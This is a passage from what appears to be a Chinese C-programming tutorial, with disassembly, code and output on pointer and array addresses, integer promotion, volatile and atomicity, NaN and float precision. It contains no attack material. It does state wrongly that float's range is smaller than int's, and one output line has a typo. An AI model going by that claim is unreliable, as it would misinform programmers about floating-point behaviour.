class="number">-0x14</span>(%ebp)</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   对应的代码为value = &amp;array[0]。从汇编指令中可以明确看出，array、&amp;array、&amp;array[0]，实际上都是同一个地址。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="number">0x0804842f</span> &lt;+<span class="number">66</span>&gt;:    lea    <span class="number">-0x10</span>(%ebp),%eax</span><br><span class="line">   <span class="number">0x08048432</span> &lt;+<span class="number">69</span>&gt;:    mov    %eax,<span class="number">-0x14</span>(%ebp)</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   对应的代码是value = pointer。注意这里使用的是mov指令而不是lea指令。是将指针int *pointer的值0赋值给value。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="number">0x08048435</span> &lt;+<span class="number">72</span>&gt;:    mov    <span class="number">-0x18</span>(%ebp),%eax</span><br><span class="line">   <span class="number">0x08048438</span> &lt;+<span class="number">75</span>&gt;:    mov    %eax,<span class="number">-0x14</span>(%ebp)</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   对应的代码是value = &amp;pointer；是将int *pointer的地址赋值给value。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="number">0x0804843b</span> &lt;+<span class="number">78</span>&gt;:    lea    <span class="number">-0x18</span>(%ebp),%eax</span><br><span class="line">   <span class="number">0x0804843e</span> &lt;+<span class="number">81</span>&gt;:    mov    %eax,<span class="number">-0x14</span>(%ebp)</span><br><span class="line">   <span class="number">0x08048441</span> &lt;+<span class="number">84</span>&gt;:    mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">   <span class="number">0x08048446</span> &lt;+<span class="number">89</span>&gt;:    leave</span><br><span class="line">   <span class="number">0x08048447</span> &lt;+<span class="number">90</span>&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></div>

<p>通过上面的汇编代码，我们可以深入地理解C语言中的指针和数组的真正含义。要认识到指针其实就是一个变量，只不过这个变量是用于保存地址的（实际上也可以保存其他内容，如一个整数），或者说它保存的值可以被视为地址。因为指针类型可以合法地使用“*”运算符，做提领运算。而这个提领运算，其实就是将变量的值视为一个地址，然后从这个地址中读取值。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">short</span> *p1 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>   **p2 = <span class="number">0</span>;</span><br><span class="line">        ++p1;</span><br><span class="line">        ++p2;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p1 = %d, p2 = %d\n&quot;</span>, p1, p2);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果真正理解了指针，看完代码，就可以迅速地说出最终的结果。如果你还在犹豫，那就说明你对指针的理解还不够透彻。其输出结果为：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[fgao@ubuntu chapter14]#./a.out</span><br><span class="line">p1 = <span class="number">2</span>, p2 = <span class="number">4</span></span><br></pre></td></tr></table></figure></div>

<p>简单解释一下。前面说了，指针其实就是一个变量，一般情况下其在32位系统上占用的空间为4字节，在64位系统上占用的空间为8字节。上面的代码中，将0赋给p1和p2，本质上是p1和p2保存了0值。然后p1和p2自增，这时要考虑指针指向的类型，其步进为sizeof（short）和sizeof（int*）。所以自增后，p1和p2保存的值分别为2和4。最让人疑惑的是最后一句，实际上是将p1和p2视为整数，打印它们的值。那么结果自然就是2和4了。</p>
<h2 id="再论数组首地址"><a href="#再论数组首地址" class="headerlink" title="再论数组首地址"></a>再论数组首地址</h2><p>通过汇编代码，我们知道array、&amp;array和&amp;array[0]的地址是相同的，那么它们三者是否有相同的含义呢？请看下面的示例代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;a[0][0] address is 0x%X\n&quot;</span>, &amp;a[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;a[0][0]+1 address is 0x%X\n&quot;</span>, &amp;a[<span class="number">0</span>][<span class="number">0</span>]+<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size of pointer step is 0x%X\n&quot;</span>, <span class="keyword">sizeof</span>(*(&amp;a[<span class="number">0</span>][<span class="number">0</span>])));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;a[0] address is 0x%X\n&quot;</span>, &amp;a[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;a[0]+1 address is 0x%X\n&quot;</span>, &amp;a[<span class="number">0</span>]+<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size of pointer step is 0x%X\n&quot;</span>, <span class="keyword">sizeof</span>(*(&amp;a[<span class="number">0</span>])));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a address is 0x%X\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a+1 address is 0x%X\n&quot;</span>, a+<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size of pointer step is 0x%X\n&quot;</span>, <span class="keyword">sizeof</span>(*a));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;a address is 0x%X\n&quot;</span>, &amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;a+1 address is 0x%X\n&quot;</span>, &amp;a+<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size of pointer step is 0x%X\n&quot;</span>, <span class="keyword">sizeof</span>(*(&amp;a)));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>大家可以先想一下其运行结果是什么，然后再看下面的结果：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[fgao@ubuntu chapter15]#./a.out</span><br><span class="line">&amp;a[<span class="number">0</span>][<span class="number">0</span>] address is <span class="number">0xBF903D48</span></span><br><span class="line">&amp;a[<span class="number">0</span>]<span class="number">0</span>]+<span class="number">1</span> address is <span class="number">0xBF903D4C</span></span><br><span class="line">size of pointer step is <span class="number">0x4</span></span><br><span class="line">&amp;a[<span class="number">0</span>] address is <span class="number">0xBF903D48</span></span><br><span class="line">&amp;a[<span class="number">0</span>]+<span class="number">1</span> address is <span class="number">0xBF903D54</span></span><br><span class="line">size of pointer step is <span class="number">0xC</span></span><br><span class="line">a address is <span class="number">0xBF903D48</span></span><br><span class="line">a+<span class="number">1</span> address is <span class="number">0xBF903D54</span></span><br><span class="line">size of pointer step is <span class="number">0xC</span></span><br><span class="line">&amp;a address is <span class="number">0xBF903D48</span></span><br><span class="line">&amp;a+<span class="number">1</span> address is <span class="number">0xBF903D60</span></span><br><span class="line">size of pointer step is <span class="number">0x18</span></span><br></pre></td></tr></table></figure></div>

<p>从输出上看，可以发现<code>&amp;a[0][0]、&amp;a[0]、a，</code>还有&amp;a的地址值都是相同的，然而其步进1即地址+1的值却完全不同。为什么会是这样呢？因为尽管这几个变量的地址相同，但是其变量类型却是不同的：</p>
<ul>
<li><code>&amp;a[0][0]</code>的类型是<code>int *pointer</code>，所以步长为4字节。</li>
<li><code>&amp;a[0]</code>的类型为<code>int（*pointer）[3]</code>，所以步长为12字节。</li>
<li><code>a</code>的类型也为<code>int（*pointer）[3]</code>，所以其步长也为12字节。</li>
<li><code>&amp;a</code>的类型为<code>int（*pointer）[2][3]</code>，所以其步长为24字节。</li>
</ul>
<h2 id="不是你想的那个整数类型转换"><a href="#不是你想的那个整数类型转换" class="headerlink" title="不是你想的那个整数类型转换"></a>不是你想的那个整数类型转换</h2><p>大家可能会觉得整数类型转换很简单，也许同样会觉得本节也没什么难度。请大家先耐心看一下下面的示例：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINT_COMPARE_RESULT(a, b) \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (a &gt; b) &#123; \</span></span><br><span class="line"><span class="meta">                printf(#a <span class="string">&quot; &gt; &quot;</span> #b <span class="string">&quot;\n&quot;</span>); \</span></span><br><span class="line"><span class="meta">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( a &lt; b) &#123; \</span></span><br><span class="line"><span class="meta">                printf(#a <span class="string">&quot; &lt; &quot;</span> #b <span class="string">&quot;\n&quot;</span>); \</span></span><br><span class="line"><span class="meta">        &#125; <span class="keyword">else</span> &#123; \</span></span><br><span class="line"><span class="meta">                printf(#a <span class="string">&quot; = &quot;</span> #b <span class="string">&quot;\n&quot;</span>); \</span></span><br><span class="line"><span class="meta">        &#125;</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">       <span class="type">signed</span> <span class="type">int</span> a = <span class="number">-1</span>;</span><br><span class="line">       <span class="type">unsigned</span> <span class="type">int</span> b = <span class="number">2</span>;</span><br><span class="line">       <span class="type">signed</span> <span class="type">short</span> c = <span class="number">-1</span>;</span><br><span class="line">       <span class="type">unsigned</span> <span class="type">short</span> d = <span class="number">2</span>;</span><br><span class="line">       PRINT_COMPARE_RESULT(a, b);</span><br><span class="line">       PRINT_COMPARE_RESULT(c, d);</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>大多数同学可能都遇到过这类将a和b进行比较的题目，结果是a&gt;b，原因也很简单明确：当signed int和unsigned int进行比较时，signed int会被转换为unsigned int。-1的值即0xFFFFFFFF，就被视为无符号整数的最大值，因此a&gt;b。然而对于c和d来说，其类型分别是signed short和unsigned short，那么结果又会是什么呢？请看下面的输出：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[fgao@ubuntu chapter15]#./a.out</span><br><span class="line">a &gt; b</span><br><span class="line">c &lt; d</span><br></pre></td></tr></table></figure></div>

<p>是不是感觉有些意外？为什么仅仅从int变为short，其结果就截然不同了呢？原因在于C标准规定，当进行整数提升时，如果int类型可以表示原始类型的所有值时，它就被转换为int类型；不然则被转换为unsigned int。所以当c和d进行比较时，c和d的类型分别是short和unsigned short，那么它们就会被转换为int类型，则实际是对（int）-1和（int）2进行比较，结果自然是c＜d。</p>
<h2 id="小心volatile的原子性误解"><a href="#小心volatile的原子性误解" class="headerlink" title="小心volatile的原子性误解"></a>小心volatile的原子性误解</h2><p>关于volatile的说明，是一个老生常谈的问题。其定义很简单，可以理解为易变的，防止编译器对其优化。因此其用途一般有以下三种：</p>
<ul>
<li>外部设备寄存器映射后的内存——因为外部寄存器随时可能由于外部设备的状态变化而改变，因此映射后的内存需要用volatile来修饰。</li>
<li>多线程或异步访问的全局变量。</li>
<li>嵌入式编程——防止编译器对其优化。</li>
</ul>
<p>对第1种和第3种的用途大家基本上都不会有什么误解，但经常会错误地理解第2种情况：认为int类型的加减操作是原子的，因此在使用了volatile后，就无须使用锁来进行竞争保护了。比如下面这样的代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">volatile</span> <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add_counter</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ++counter;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 其反汇编代码为：</span></span><br><span class="line">add_counter:</span><br><span class="line">pushl %ebp</span><br><span class="line">movl %esp, %ebp</span><br><span class="line">movl counter, %eax</span><br><span class="line">addl $<span class="number">1</span>, %eax</span><br><span class="line">movl %eax, counter</span><br><span class="line">popl %ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></div>

<p>上面的汇编代码，首先是将counter的值保存到eax寄存器，然后对eax进行加1操作，最后再将eax的值保存到counter中。这样，++counter就绝不可能是原子操作了，必须使用锁保护。</p>
<p>那么volatile对于变量来说，究竟有什么样的效果呢？下面的代码对上面的代码进行了一些修改：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add_counter</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (; counter != <span class="number">10</span>;) &#123;</span><br><span class="line">        ++counter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -S -O</span></span><br><span class="line">add_counter:</span><br><span class="line">.LFB0:</span><br><span class="line">        .cfi_startproc</span><br><span class="line">        movl    counter, %eax</span><br><span class="line">        cmpl    $<span class="number">10</span>, %eax</span><br><span class="line">        je      .L1</span><br><span class="line">.L4:</span><br><span class="line">        addl    $<span class="number">1</span>, %eax</span><br><span class="line">        cmpl    $<span class="number">10</span>, %eax</span><br><span class="line">        jne     .L4</span><br><span class="line">        movl    $<span class="number">10</span>, counter</span><br><span class="line">.L1:</span><br><span class="line">        rep ret</span><br><span class="line">        .cfi_endproc</span><br><span class="line">.LFE0:</span><br></pre></td></tr></table></figure></div>

<p>从上面的汇编代码可以清晰地看出，在进入add_counter后，首先会将counter的值赋给eax寄存器，然后eax进行加1操作，再与立即数10进行比较。也就是说，for循环的C代码只涉及eax寄存器，而不会对counter进行任何访问。</p>
<p>现在对volatile的理解就比较深刻了。volatile只能保证在访问该变量时，每次都是从内存中读取最新值，并不会使用寄存器中缓存的值。而对该变量的修改，volatile并不提供原子性的保证。</p>
<h2 id="“x-x”-何时为假？"><a href="#“x-x”-何时为假？" class="headerlink" title="“x&#x3D;&#x3D;x” 何时为假？"></a>“x&#x3D;&#x3D;x” 何时为假？</h2><p>看到这个题目，大家可能会想到一些比较另类的方法，比如使用宏定义，或者用高级语言中的操作符重载之类的。但如果说要求使用最原始的C语言表达式，那么什么时候“x&#x3D;&#x3D;x”会是假呢？请看下面的代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">float</span> x = <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">if</span> (x == x) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Equal\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Not equal\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;x(%f) &gt;= 0\n&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;x(%f) &lt; 0\n&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;x, &amp;a, <span class="keyword">sizeof</span>(x));</span><br><span class="line">    <span class="keyword">if</span> (x == x) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Equal\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Not equal\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;x(%f) &gt;= 0\n&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;x(%f) &lt; 0\n&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Surprise x(%f)!!!\n&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[fgao@ubuntu chapter15]#./a.out</span><br><span class="line">Equal</span><br><span class="line"><span class="title function_">x</span><span class="params">(<span class="number">4294967296.000000</span>)</span> &gt;= <span class="number">0</span></span><br><span class="line">Not equal</span><br><span class="line">Surprise <span class="title function_">x</span><span class="params">(-nan)</span>!!!</span><br></pre></td></tr></table></figure></div>

<p>这样的结果是不是有些意外呢？简单解释一下其中的原因：</p>
<ul>
<li>当<code>float x=0xffffffff</code>时，将整数赋值给一个浮点数，由于float和int都占用了4字节，但浮点数的存储格式与整数不同，其需要一定的数位来作为小数位，所以float的表示范围要小于int。这里涉及了C语言中的类型转换。</li>
<li>当整数转换为浮点数时，尽管数值会有所变化，但结果一定是一个合法的浮点值。所以x一定等于x，且x不是大于等于0，就是小于0。</li>
<li>当使用memcpy将0xff填充到x的地址时，这时保证了x储存的一定是0xffffffff，但很可惜它不是一个合法的浮点值，而是一个特殊值NaN。</li>
<li>作为一个非法的浮点数NaN，当它与任何数值相比较时，都会返回假。所以就有了比较意外的结果x&#x3D;&#x3D;x为假，x即不大于0，不小于0，也不等于0。</li>
</ul>
<h2 id="小心浮点陷阱"><a href="#小心浮点陷阱" class="headerlink" title="小心浮点陷阱"></a>小心浮点陷阱</h2><h3 id="浮点数的精度限制"><a href="#浮点数的精度限制" class="headerlink" title="浮点数的精度限制"></a>浮点数的精度限制</h3><p>浮点数的存储格式与整数完全不同。大部分的实现采用的是IEEE 754标准，float类型是1个sign bit、8个exponent bits和23个mantissa bits。而double类型是1个sign bit、11个exponent bits和52个mantissa bits。关于浮点数是如何表示小数部分的，大家可以自行参考维基百科。简单来说，小数部分是依靠2的负多少次方来近似表示的，因此浮点数存在精度的问题，对浮点数进行比较时，要使用范围比较。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">float</span> x = <span class="number">0.123</span><span class="number">-0.11</span><span class="number">-0.013</span>;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;x is 0!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-0.0000000001</span> &lt; x &amp;&amp; x &lt; <span class="number">0.0000000001</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;x is in 0 range!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">[fgao@ubuntu chapter15]<span class="meta">#gcc -Wall 15_8_float1.c</span></span><br><span class="line">[fgao@ubuntu chapter15]#./a.out</span><br><span class="line">x is in <span class="number">0</span> range!</span><br></pre></td></tr></table></figure></div>

<p>从数学的角度看，<code>float x=0.123-0.11-0.013</code>，得到的一定是0。但对于浮点数来说，因为其不能精确地表示小数，因此x最终的结果是一个趋近于0的值。故而不能用0和x直接进行比较，而是要使用一个范围来确定x是否为0。</p>
<h3 id="两个特殊的浮点值"><a href="#两个特殊的浮点值" class="headerlink" title="两个特殊的浮点值"></a>两个特殊的浮点值</h3><p>浮点数有两个特殊的值，除了前面的NaN（Not a Number），还有一个infinite即无限。前面使用memcpy构造了一个NaN的浮点数。可能有人会问，平常有谁会用memcpy去填充浮点数呢？因此我不可能遇到NaN。那么，请看下面的示例：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">float</span> x = <span class="number">1</span>/<span class="number">0.0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;x is %f\n&quot;</span>, x);</span><br><span class="line">    x = <span class="number">0</span>/<span class="number">0.0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;x is %f\n&quot;</span>, x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// </span></span><br><span class="line">[fgao@ubuntu chapter15]#./a.out</span><br><span class="line">x is inf</span><br><span class="line">x is -nan</span><br></pre></td></tr></table></figure></div>

<p>当1除以0.0时，得到的是infinite，而用0除以0.0时，得到的就是NaN。虽然这里完全只是一则普通的除法运算，但也会产生NaN的情况。那么当使用除法运算时，对除数进行检查，保证其不为0.0，是否就可以避免NaN了？再看下面的代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">float</span> x;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>, &amp;x);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;x is %f\n&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">[fgao@ubuntu chapter15]<span class="meta">#gcc -Wall 15_8_float3.c</span></span><br><span class="line">[fgao@ubuntu chapter15]#./a.out</span><br><span 